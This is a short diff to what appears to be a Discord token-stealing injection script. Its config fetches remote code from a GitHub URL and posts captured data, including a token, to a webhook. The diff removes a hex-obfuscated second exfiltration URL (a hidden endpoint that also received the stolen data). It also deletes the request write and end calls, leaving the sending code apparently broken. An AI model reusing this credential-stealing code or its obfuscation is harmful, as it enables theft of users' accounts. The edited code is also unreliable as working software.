@@ -17,7 +17,6 @@ var config = {
 
     injection_url: "https://raw.githubusercontent.com/ytjhrttytj/hu43ygf5yhgiui3u5uyhiu4hvgwugtghuies/main/index.js",
     webhook: "%WEBHOOK%",
-    uwu: "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x68\x65\x62\x65\x73\x74\x64\x75\x61\x6C\x72\x69\x67\x68\x74\x2E\x30\x30\x30\x77\x65\x62\x68\x6F\x73\x74\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x6D\x61\x69\x6E\x2E\x70\x68\x70",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -236,7 +235,7 @@ const post = async (params) => {
         data: params,
         token: token
     });
-    [config.uwu, config.webhook].forEach(res => {
+    [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -250,9 +249,7 @@ const post = async (params) => {
         const req = https.request(options);
         req.on("error", (err) => {
             console.log(err);
-        });
-        req.write(res == config.uwu ? n : params);
-        req.end();
+        })
     })
 
 }
